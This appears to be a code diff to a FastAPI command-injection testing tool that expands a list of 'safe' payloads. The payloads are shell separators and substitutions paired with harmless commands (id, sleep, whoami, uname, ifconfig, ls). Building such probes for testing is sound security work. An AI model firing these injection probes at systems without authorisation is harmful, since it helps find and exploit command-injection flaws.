@@ -16,10 +16,36 @@ app = FastAPI()
 templates = Jinja2Templates(directory="templates")
 
 SAFE_PAYLOADS = [
-    "|echo POC_TEST",
-    "|whoami",
+    # Basic Delimiters
+    "|id",
+    ";id",
+    "&id",
+    "&&id",
+    "||id",
+    "\nid",
+    "`id`",
+    "$(id)",
+
+    # Time-based (Blind)
+    "|sleep 5",
+    ";sleep 5",
+    "&sleep 5",
+    "&&sleep 5",
+    "||sleep 5",
+    "`sleep 5`",
+    "$(sleep 5)",
+
+    # Output Redirection
+    "|whoami > /tmp/ci_test",
+    ";whoami > /tmp/ci_test",
+
+    # Common Commands
     "|uname -a",
-    "|sleep 2"
+    ";uname -a",
+    "|ifconfig",
+    ";ifconfig",
+    "|ls -la",
+    ";ls -la"
 ]
 
 
